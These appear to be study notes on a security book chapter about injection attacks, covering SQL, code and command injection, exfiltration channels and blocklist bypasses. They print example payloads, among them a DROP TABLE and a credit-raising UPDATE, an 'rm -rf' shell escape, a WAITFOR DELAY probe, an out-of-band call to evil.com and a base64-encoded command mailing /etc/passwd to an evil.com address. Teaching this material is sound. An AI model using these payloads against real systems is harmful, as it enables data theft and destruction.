# Chapter 28: Injection

## Core Idea
Injection attacks occur wherever a payload from an untrusted user is read into an interpreter (SQL engine, CLI, or host OS shell) via unsanitized string concatenation; the attacker's goal is to make that interpreter execute logic the developer never intended.

## Frameworks Introduced
- **Interpreter + Payload model**: every injection attack has exactly two components — an interpreter and a user-supplied payload read into it.
  - When to use: to classify any suspected injection bug (SQL, CLI, OS shell, or otherwise).
  - How: identify what interpreter ultimately consumes the string, then check whether user input reaches it via concatenation instead of parameterization.
- **Injection severity ladder**: SQL injection (subset of code injection) → code injection (targets an interpreter/CLI, scoped/contained) → command injection (targets the host OS directly, unbounded).
  - When to use: to assess blast radius of a found vulnerability.
  - How: determine whether the compromised command runs inside a sandboxed interpreter/CLI context or directly against the host OS; command injection is strictly more dangerous because it exposes the entire OS (files, permissions, other integrations).
- **Data exfiltration channel selection (In-band / Out-of-band / Inferential)**: pick the exfiltration technique based on whether the server reflects query results.
  - When to use: after confirming an injection point but before you know how to extract value from it.
  - How: if results appear directly in the response, use in-band; if not, try OOB via the interpreter's built-in HTTP request function; if the interpreter has no HTTP egress (locked-down permissions), fall back to inferential/blind techniques like timing delays.

## Key Concepts
- **SQL injection**: escaping a SQL string embedded in an HTTP payload so the interpreter executes attacker-supplied query logic instead of (or in addition to) the intended query.
- **Code injection**: unsanitized input causes an unintended action inside a CLI or interpreter (e.g., an image/video conversion CLI), without reaching the host OS.
- **Command injection**: an elevated form of code injection where the injected input escapes the CLI/interpreter context entirely and executes directly against the host OS shell.
- **In-band exfiltration**: attacker payload results are returned directly in the same HTTP response/browser used to send the attack — no extra technique needed.
- **Out-of-band (OOB) SQLi**: the interpreter's built-in HTTP-request utility (e.g., `UTIL_HTTP.request`) is used to send query results to an attacker-controlled server, since the app itself won't reflect them.
- **Inferential/blind injection**: neither in-band nor OOB works (e.g., interpreter has no egress permission), so the attacker infers success/data via side channels like response timing or error/crash behavior.
- **Blocklist (deny-list)**: a defense that rejects known-bad keywords/strings; trivially bypassed because the same logic can be re-encoded (e.g., base64) to evade plain-text matching.
- **Allowlist**: implied contrast to blocklist — validating against a known-good set rather than excluding known-bad ones; the author calls blocklists "a very poor security mechanism when compared to allowlists."

## Mental Models
- Think of SQL injection as "code injection" is to "command injection" as a sandboxed room is to the whole building: code injection stays inside the interpreter's walls, command injection breaks out into the host OS.
- Use in-band exfiltration when the app talks back to you; use OOB when the app is silent but the interpreter can phone home for you; use inferential/blind (timing) techniques only when both of those doors are locked.
- Treat any blocklist as an encoding puzzle for the attacker, not a wall — if the filter checks plain text, any equivalent encoding (base64, alternate command syntax) slips through.

## Anti-patterns
- **String concatenation into SQL/CLI/shell commands**: e.g. `'SELECT * FROM users WHERE USER = ' + user_id` — trusts unsanitized network input as part of executable syntax; the fix (prepared statements/parameterized queries) is deferred to the defense chapter but the failure mode here is direct query/command tampering.
- **Blocklist-based input filtration**: matches only known-bad plain-text strings/keywords; any alternate encoding (base64) or alternate phrasing of the same logic bypasses it entirely, as demonstrated by the `mail`/base64 example.
- **Unprivileged execution assumptions**: relying on a CLI/interpreter to contain damage without actually configuring OS-level unprivileged user permissions leaves command injection able to compromise the full host.

## Code Examples
```php
$sql = "SELECT userId, username, admin, moderator FROM users WHERE username = '".$_POST['username']."' AND password = '".sha1($_POST['password'])."';";
```
```javascript
// Vulnerable Node.js/mssql concatenation
const result = await sql.query('SELECT * FROM users WHERE USER = ' + user_id);

// Truthy bypass
const user_id = '1=1'
// => SELECT * FROM users where USER = true  (returns all users)

// Destructive payload
user_id = '123abc; DROP TABLE users;';
// => SELECT * FROM users WHERE USER = 123abd; DROP TABLE users;

// Stealthy privilege-escalation payload
const user_id = '123abc; UPDATE users SET credits = 10000 WHERE user = 123abd;'
```
```bash
# Command injection via CLI escape (&& chain)
const options = "' && rm -rf /videos";
# results in:
$ convert -d vidData.mp4 -n myVid.mp4 -o '-s 1280x720' && rm -rf /videos
```
```javascript
// Blind (time-based) SQL injection using WAITFOR DELAY
const payload = `user_id=1or1=WAITFOR DELAY '0:0:30'`;
const url = `https://megabank.com/update?${payload}`;
updateUser(url, (result) => {
  // nothing is displayed, but response is delayed 30 seconds
  console.log(result);
});
```
```bash
# Blocklist bypass via base64 encoding
# 1. Encode client-side (e.g., Chrome devtools):
const b64 = btoa('mail -s "leaked file" "email@evil.com" < /etc/passwd');
// bWFpbCAtcyAibGVha2VkIGZpbGUiICJlbWFpbEBldmlsLmNvbSIgPCAvZXRjL3Bhc3N3ZA==

# 2. Feed the encoded payload past the plain-text blocklist, decode+execute server-side:
base64 -D <<< bWFpbCAtcyAibGVha2VkIGZpbGUiICJlbWFpbEBldmlsLmNvbSIgPCAvZXRjL3Bhc3N3ZA== | sh
```
- **What it demonstrates**: from top to bottom — the classic PHP concatenation vulnerability, three escalating SQL payloads (truthy bypass, destructive DROP, stealthy privilege-escalation UPDATE), a shell `&&` command-injection escape, a WAITFOR-based blind/time-based SQLi probe, and a base64 encoding trick that defeats plain-text blocklists.

## Reference Tables
| Channel | What it is | When attacker uses it | Example technique |
|---|---|---|---|
| In-band | Payload results appear directly in the same HTTP response/browser used to send the attack | Default case — server reflects query output | `user_id=1or1="select * from users"`, result logged directly from response |
| Out-of-band (OOB) | Interpreter's own network/HTTP utility exfiltrates data to an attacker-controlled server | Server doesn't reflect results but the interpreter has outbound HTTP capability | `UTIL_HTTP.request('https://evil.com', ...)` inside the injected SQL |
| Inferential (blind) | No direct or OOB channel exists; attacker infers data from side effects (timing, errors, crashes) | Interpreter permissions are locked down (no HTTP egress) and app gives no output | `WAITFOR DELAY '0:0:30'` — a 30s response delay confirms payload success; branch on true/false to leak data bit by bit |

## Worked Example
MegaBank runs a media-compression service at `https://media.mega-bank.com` with `uploadVideo` (POST). The endpoint builds a video-processing CLI call by concatenating request fields directly into a command string: `options = defaultOptions + req.body.options`, then `exec('convert -d ${videoData} -n ${videoName} -o ${options}')`. A benign caller supplies `options = '-c h264 -ab 192k'`. Because the `convert` CLI's own syntax allows chaining (line breaks, in this case), an attacker instead supplies `options = '-c h264 -ab 192k \ convert -dir /videos -s 1x1'`, injecting a second `convert` invocation that operates on videos the attacker doesn't own — this is code injection, contained to the converter CLI. Escalating further, if the CLI runs directly against the host Unix shell rather than its own sandboxed context, an attacker can break out of the intended argument entirely with `options = "' && rm -rf /videos"`, producing `convert -d vidData.mp4 -n myVid.mp4 -o '-s 1280x720' && rm -rf /videos` — now executing arbitrary commands (file deletion) against the host OS itself. This is command injection: the same root cause (unsanitized concatenation into an executed string) but with the entire OS as blast radius instead of just the CLI's own scope.

## Key Takeaways
1. Classify any injection by interpreter type (SQL / CLI-scoped code injection / host-OS command injection) — the classification determines blast radius and urgency.
2. String concatenation into any executed command (SQL, CLI args, or shell) is the root cause; the attack surface exists the moment user input reaches an interpreter unparameterized.
3. When results aren't reflected, don't assume the injection failed — check for OOB (interpreter HTTP utilities) or inferential/blind channels (timing via WAITFOR DELAY) before abandoning the attack path.
4. Command injection is uniquely dangerous because it exposes sensitive OS files (`/etc/passwd`, `/etc/shadow`, `~/.ssh`, web-server configs) and can enable data theft, log tampering, backdoor accounts, phishing-form swaps, or total server wipe.
5. Blocklists are inherently bypassable — any encoding (base64) or alternate syntactic phrasing that the interpreter still understands slips past plain-text matching; treat blocklists as a weak secondary control at best.
6. Non-SQL CLIs/interpreters are comparatively under-researched and less likely to have hardened defenses (unlike SQL, which has two decades of prepared-statement/stored-procedure mitigation) — a high-value target area for testers.

## Connects To
- **Defending Against Injection chapter**: this attack chapter's countermeasures (prepared statements, stored procedures, parameterized queries, allowlists, least-privilege OS permissions) are covered in the later "Defending Against Injection" chapter (exact global chapter number not yet finalized, so reference it by title only)
- **Parameterized queries / ORM**: the structural fix for string-concatenation SQL — binds user input as data rather than executable syntax, eliminating the truthy-bypass and statement-chaining classes of payload shown here
